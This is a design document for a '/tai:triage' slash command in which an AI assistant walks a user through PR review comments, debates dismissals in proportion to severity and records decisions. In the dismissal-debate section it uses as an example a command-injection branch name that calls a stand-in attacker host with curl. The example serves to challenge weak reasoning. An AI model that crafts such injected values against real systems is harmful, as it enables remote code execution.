## Context

`/tai:triage` is the last piece of the original `pr-review-triage` skill that needs porting. The skill today does five things: collect comments, enrich them, walk the user through each one, debate dismissals, and persist decisions. Of those, three are now in tai:

| Step | Where it lives now |
|---|---|
| Collect comments | `/tai:import` (specified in `add-import-command`) |
| Enrich (severity, category, why, fix, consequences) | `/tai:import` |
| Persist | `tai` CLI (storage, import, triage-state) |
| Walk the user through each comment, batches-first | `/tai:triage` ← this proposal |
| Debate dismissals (sparring) | `/tai:triage` ← this proposal |

The slash command's body is the place where AI opinion lives. The CLI is impartial; the conversation is not.

This document records the choices that shape the slash command's behaviour. The corresponding `specs/triage-command/spec.md` carries the normative contract.

## Goals / Non-Goals

**Goals:**

- A loop that surfaces *the same comment to the user the same way every time*, regardless of which Claude session is running it.
- A debate protocol substantive enough to catch reasoning errors but bounded enough that nitpicks aren't blown into multi-round arguments.
- Investigation that catches the easy "already fixed" cases without overreaching into heuristics that produce false positives.
- Batch handling that lets the user override individual members in conversation without re-architecting the batch concept.

**Non-Goals:**

- A persistent "session" state across Claude conversations (e.g. "where did I leave off"). State is in tai's DB; the slash command picks up wherever `tai status` says there are pending comments.
- Network calls. The slash command MUST NOT fetch new comments from GitHub during triage — that's the import command's job. Triage operates on the rows already in the DB.
- A TUI / interactive curses-style interface. The conversation IS the interface.
- An automation mode that triages without user input. The whole point is human-in-the-loop sparring.
- Splitting the slash command into multiple small commands (e.g. `/tai:triage-batch`, `/tai:triage-comment`). One conversation, one command.

## Decisions

### D1. Scope resolution mirrors the CLI

The slash command's first action is `tai status [--pr X | --branch Y]` to verify a scope is resolvable. The CLI's own scope-resolution rules (`add-triage-state` D1) apply. The slash command does NOT reimplement scope detection.

- `/tai:triage` (no args) → call `tai status`. If it fails with `TRIAGE_NO_SCOPE`, tell the user; if `TRIAGE_AMBIGUOUS_SCOPE`, ask them to pick.
- `/tai:triage --pr 142` → call `tai status --pr 142`.
- `/tai:triage --branch feat/x` → call `tai status --branch feat/x`.
- `/tai:triage stack` → iterate `st_reviews` or `gh pr list` to enumerate the stack, run the loop per PR ancestor-first.

**Alternatives considered:**

- The slash command parses `git config` and the DB to decide scope itself. Reimplements work the CLI already does; risks divergence.

### D2. Investigation runs before any triage prompt

Phase 1 walks every `pending` comment in the scope and looks for evidence the comment has already been addressed. Sources of evidence (in order of trust):

1. The file referenced by `comments.file` no longer exists OR was renamed away from that path.
2. The exact code snippet flagged in the comment's `description` is no longer present at `comments.lines` (using a fuzzy line-range match — `git blame` or just reading the current file).
3. The `suggested_fix` pattern is observable in the current file (e.g. comment suggested `execFileSync`, current file uses `execFileSync`).
4. The git history shows a relevant change since the comment was imported (`git log --oneline -10 -- <file>` containing keywords from the comment's title).

When evidence is found, the slash command calls `tai complete <id> --resolution "<what was found>"` and continues. The user MUST be told what was found and given an opportunity to override (`I think this is still an issue, please don't mark it completed`).

**Alternatives considered:**

- Skip investigation; ask the user about every comment. Annoying for users who've already fixed half the comments since the import.
- Aggressive investigation that infers completion from circumstantial evidence. False positives are worse than false negatives here; we'd be telling the user a security fix is in place when it isn't.
- Cache investigation results in the DB. Premature; investigation is fast and the user might fix things between runs.

### D3. Batches first, individuals next, severity-ordered within each group

Within a scope:

1. Enumerate batches. Order them by the highest-severity member's severity (`critical > major > minor > nitpick`).
2. For each batch in order: present, decide, persist.
3. Enumerate non-batched comments. Order by severity, then by file path.
4. For each non-batched comment: present, decide, persist.

After every decision, run `tai status` to refresh counts; show the user `[X/Y] N accepted, M completed, K dismissed, L remaining`.

**Alternatives considered:**

- File-order ("walk through the codebase"). Loses the "knock out the worst stuff first" property.
- Random order. No.

### D4. Decision prompt is consistent for batches and individuals

The slash command asks the same shape of question every time:

```
Accept, dismiss, or complete? Any thoughts on the fix?
```

User answers in free text. Claude parses:

- "Accept" / "yes" / "do it" → `tai accept`. Capture any resolution proposal.
- "Dismiss" / "skip" / "no" → enter the dismissal-debate contract (D5).
- "Already fixed" / "done" / "we did this" → `tai complete` with a resolution describing what they say was done.
- Free-text fix proposal → evaluate honestly, then ask explicit accept/dismiss/complete.

**Alternatives considered:**

- Numbered options. Less natural; rejects nuanced inputs like "accept but rewrite the fix as X".
- Auto-accept anything without an explicit dismiss. Dangerous; users mumble.

### D5. Dismissal-debate contract — substantive when warranted, light when not

When the user wants to dismiss, the slash command:

1. **Understand reasoning first.** If the user dismisses without explaining, ask why.
2. **Calibrate effort to severity.**
   - `critical` (especially security) — challenge with concrete scenarios; require multiple rounds if the user's first reason is thin. Concrete is: "A branch named `feat/x$(curl attacker.com)` reaches this code via `…`. Walk me through why that fails." Not concrete is: "Are you sure?".
   - `major` — challenge once with a concrete scenario; accept the user's response unless it has a real gap.
   - `minor` / `nitpick` — accept the dismissal after a one-sentence "noted, here's the reason on record" exchange.
3. **Watch for biases.**
   - Assumptions treated as facts ("that can't happen" — ask for evidence).
   - Scope dismissal ("nobody would do that" when the attack surface is public).
   - Effort bias (dismissing because the fix seems hard, not because the issue is invalid).
   - Anchoring (over-weighting or under-weighting the reviewer's framing).
4. **Don't argue for argument's sake.** If the user's reasoning is sound after one round, say so.
5. **Conclude and record.** `tai dismiss <id> --reason "<agreed reasoning>"`. The reason should reflect what the conversation produced, not the user's first sentence.

The contract is part of the slash command's body markdown. It is enforceable because the body is reviewable — a reviewer reading `commands/triage.md` can see whether the protocol is honoured.

**Alternatives considered:**

- A flat "always argue once" rule. Hostile to nitpicks; tedious.
- A "always accept the dismissal" rule. Misses the entire point of having an AI in the loop.

### D6. Batch overrides during conversation

When a batch decision is being made, the user's response may name individual members:

> "Accept B1, except B1.4 which is a false positive on that file — that's read-only."

The slash command splits this into:

- `tai accept --batch B1` (the default)
- Then `tai dismiss 4 --reason "false positive on that file — that's read-only"` to override member B1.4.

Internal ordering: do the batch-wide call first, then the per-item overrides. After both, the batch's `status` recomputes to `mixed` (per `add-triage-state` D3), which is exactly what we want.

The slash command MUST confirm the override with the user before issuing it: "Got it — accepting B1 (B1.1, B1.2, B1.3, B1.5) and dismissing B1.4 with reason `false positive on that file — that's read-only`. Sound right?".

**Alternatives considered:**

- Iterate per-item without a batch surface. Loses the "fix these 5 things the same way" framing that batches exist for.
- Pre-split into individual prompts when overrides are detected. Same outcome; messier UX.

### D7. Recap is short and actionable

After `tai status` reports zero pending comments, the slash command emits one final message:

```
Triage complete for acme/app PR #142.

  Accepted:   <N> (incl. <B-count> batches)
  Completed:  <C> (already fixed)
  Dismissed:  <D>

Accepted work queue (severity order):
  [crit] B1.1: Replace execSync with execFileSync in src/api/auth.ts:15-29
  [crit] B1.2: Replace execSync with execFileSync in src/utils/fetch.ts:41-48
  [maj]  3:   Handle expired refresh token gracefully (src/api/auth.ts:51-57)
  …

Ready to start working through these? I can read each one again with `tai show`.
```

The accepted work queue is the most valuable artefact of triage — it's what the user actually has to *do*. Surfacing it once at the end saves them re-running `tai list` immediately afterward.

**Alternatives considered:**

- A more elaborate recap with timing data, decision rationales, etc. Premature; recap should be glanceable.

### D8. Stack mode loops per PR with explicit handoffs

For `/tai:triage stack`, the slash command:

1. Enumerates the stack via `st_reviews` (preferred) or `gh pr list` filtered to the stack's PRs (ancestor-first order).
2. For each PR: announces `Now triaging PR #<N> (1 of K)`; runs the full four-phase loop for that PR.
3. Between PRs: shows the per-PR recap and pauses for the user to acknowledge (`Continue to the next PR? [y/n]`).
4. At the end: a stack-level summary aggregating per-PR counts.

The CLI's stack support is implicit (scope is per-PR; the slash command iterates).

**Alternatives considered:**

- Run all PRs as one continuous loop without per-PR breaks. Exhausting for the user; no natural pause point.

### D9. Frontmatter conforms to `command-framework`; version starts at 1

The bundled `commands/triage.md` ships with:

```yaml
---
name: "TAI: Triage"
description: "Walk through pending PR review comments interactively, batches-first."
category: "Workflow"
tags: [tai, triage, review]
version: 1
content_hash: sha256:<computed at build time>
---
```

The `version: 1` is the initial integer. Future revisions to the body (e.g. tightening the dismissal-debate contract) bump it and append the new hash to `commands/triage.ledger.json`.

## Risks / Trade-offs

- **[Slash command body is long]** A four-phase loop with sparring rules, batch-override semantics, and stack-mode handoffs is a lot of markdown. Each Claude conversation pays the token cost. → Acceptable. The cost is bounded (a few KB) and the alternative is sub-skills that lose context.

- **[Investigation false negatives]** The slash command might miss "already fixed" cases that are obvious to a human. → Acceptable; the user will see the comment and say "we did this" and the slash command will call `tai complete`. Worse outcome (false positive marking) is explicitly avoided by being conservative.

- **[Sparring depth is judgement-driven]** "Calibrate to severity" leaves room for inconsistency between Claude sessions. → Mitigated by writing the contract concretely (the spec lists specific cognitive biases and specific severity thresholds); not eliminated.

- **[Batch overrides are conversationally fragile]** Parsing "except B1.4 which is a false positive" relies on Claude's ability to identify the override. → The confirmation step ("Sound right?") catches misparses before they hit the CLI.

- **[Stack mode is gated on staccato or gh]** Same dependency as `/tai:import`. → Acknowledged; the command bails early with a helpful message when neither is available.

- **[Recap might leak comment text into automation]** The recap surfaces accepted comments with their titles. If a user pipes the conversation transcript somewhere, those titles travel. → Not a new risk; `tai list` already surfaces this. Documented for awareness.

- **[Slash command version drift]** A user editing `triage.md` directly to tweak the prompt is supported by the hash-ledger machinery, but their changes are eventually overwritten on `tai install`. → Per `add-install-command`, the user gets a prompt; if they take it, customisations are lost. Acceptable; the proper way to customise is a fork-and-rebuild.

## Migration Plan

This is the first bundled `/tai:triage` command; no prior version exists. Users running tai for the first time install both `/tai:import` and `/tai:triage` via `tai install`. The slash command picks up from whatever state the DB is in — there is no migration of conversation state.

## Open Questions

(None remaining.)
